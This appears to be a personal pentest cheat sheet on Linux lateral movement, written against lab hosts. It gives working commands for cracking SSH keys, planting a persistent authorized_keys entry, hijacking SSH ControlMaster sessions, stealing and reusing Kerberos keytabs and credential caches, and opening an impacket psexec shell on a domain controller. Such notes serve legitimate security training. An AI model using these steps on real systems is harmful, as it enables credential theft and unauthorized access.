---
title: Linux
layout: default
parent: Lateral Movement
nav_order: 3
---

## SSH Key ##
1. Check if SSH key is passphrase protected. If got Proc-Type and DEK-Info means it is:\
`cat svuser.key`

2. Can read ~/.ssh/known_hosts to see if got hint where that key is for. Can also check ~/.bash_history if that file if known hosts is hashed.

3. If you see a hostname there can find the IP using:\
`host HOSTNAME`

4. If want to crack key, first copy over to Kali then:\
`python /usr/share/john/ssh2john.py svuser.key > svuser.hash`

5. After that crack with john:\
`sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash`

## SSH Persistence ##
1. If you have not created SSH keypair,\
`ssh-keygen`

2. Cat the content of the id_rsa.pub in ~/.ssh, then use this command to add your own pub key to the victim:\
`echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys`

## SSH Hijacking (ControlMaster) ##
1. On victim, create ~/.ssh/config file with the following content:

```
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```
2\. Set it to correct permission:\
`chmod 644 ~/.ssh/config`

3\. Create the required folder:\
`mkdir ~/.ssh/controlmaster`

4\. Now for example, if the user offsec connect to linuxvictim, you will find a file named offsec@linuxvictim:22 in the controlmaster folder:
`ls -al ~/.ssh/controlmaster/`

5\. If you are the offsec user you can then use the following to connect directly without password:
`ssh offsec@linuxvictim`

6\. If you are root/other user that can access the file also can use the following to connect:
`ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim`

## Ansible ##
1. To check for presence of ansible, can use the `ansible` command, or check if /etc/ansible exists, or any ansible username in /etc/passwd.

## Kerberos Keytab ##
1. Can use the command below to see as a hint if it is connected to Kerberos. SSH using kerberos is like this `ssh administrator@corp1.com@linuxvictim`:
`env | grep KRB5CCNAME`
`kinit`
`klist`

2. If you see a keytab file, can do the following (this for example will request for TGT as administrator@corp1):
`kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab`

3. Use klist to inspect the ticket:
`klist`

4. If it expired but still within renewal period, use the following to renew:
`kinit -R`

5. We can then use the ticket, for example smbclient:
`smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$`

## Kerberos Credential Cache File ##
1. Can try to search for the file that have the pattern like this krb5cc_*** in /tmp, which is the usual folder:
`ls -al /tmp/krb5cc_*`

2. Copy the file over:
`sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow`

3. Change the owner to current user offsec:
`sudo chown offsec:offsec /tmp/krb5cc_minenow`

4. Destroy current Kerberos ticket:
`kdestroy`

5. Set it to the new kerberos cached file:
`export KRB5CCNAME=/tmp/krb5cc_minenow`

6. Should see it:
`klist`

7. Requesting service ticket (if for example there is a service like this MSSQLSvc/DC01.corp1.com:1433@CORP1.COM):
`kvno MSSQLSvc/DC01.corp1.com:1433`

## Kerberos with Impacket ##
1. First we need the ccache file. Copy it over to attacker machine.
`scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow`

2. Set it.
`export KRB5CCNAME=/tmp/krb5cc_minenow`

3. Install the package.
`sudo apt install krb5-user`

4. Get the IP address.
`host corp1.com`

5. Add this to the /etc/hosts file. Something like this:
`192.168.120.5 CORP1.COM DC01.CORP1.COM`

6. We can then use impacket as normal:
`python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator`

7. To gain shell:
`proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass`